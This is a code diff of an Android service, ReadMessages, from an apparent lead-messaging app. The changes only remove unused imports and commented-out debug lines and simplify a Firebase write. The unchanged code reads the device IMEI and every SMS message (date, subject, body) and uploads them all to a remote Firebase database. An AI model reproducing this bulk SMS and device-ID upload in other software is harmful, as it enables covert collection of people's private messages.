@@ -1,19 +1,14 @@
 package com.nfx.leadmessages;
 
-import android.*;
-import android.Manifest;
 import android.app.Service;
 import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
-import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.IBinder;
-import android.provider.Settings;
 import android.support.annotation.Nullable;
-import android.support.v4.app.ActivityCompat;
 import android.telephony.TelephonyManager;
 
 import com.google.firebase.FirebaseApp;
@@ -40,7 +35,6 @@ public class ReadMessages extends Service {
         fpId =pref.getString(Constants.FP_ID,null);
         TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
         mobileId = tm.getDeviceId();
-        //mobileId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
 
         if(mobileId == null || fpId == null){
             return Service.START_NOT_STICKY;
@@ -55,7 +49,6 @@ public class ReadMessages extends Service {
             }
 
         }
-        //MOBILE_ID = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
 
         new Thread(new Runnable() {
             @Override
@@ -106,17 +99,13 @@ public class ReadMessages extends Service {
                 DatabaseReference MessageIdRef = mDatabase.child(fpId+Constants.MESSAGES).child(mobileId);
                 MessageIdRef.removeValue();
                 do{
-
                     message = new SmsMessage()
                             .setDate(cursor.getLong(0))
                             .setSubject(cursor.getString(1))
                             .setBody(cursor.getString(2))
                             .setSeen(cursor.getString(3));
 
-                    String key = MessageIdRef.push().getKey();
-                    MessageIdRef.child(key).setValue(message);
-
-                    //Log.v("ggg",message.toString());
+                    MessageIdRef.push().setValue(message);
 
                 }while(cursor.moveToNext());
                 cursor.close();
@@ -126,6 +115,5 @@ public class ReadMessages extends Service {
     @Override
     public void onDestroy() {
         super.onDestroy();
-        //Log.v("ggg","destroy");
     }
 }
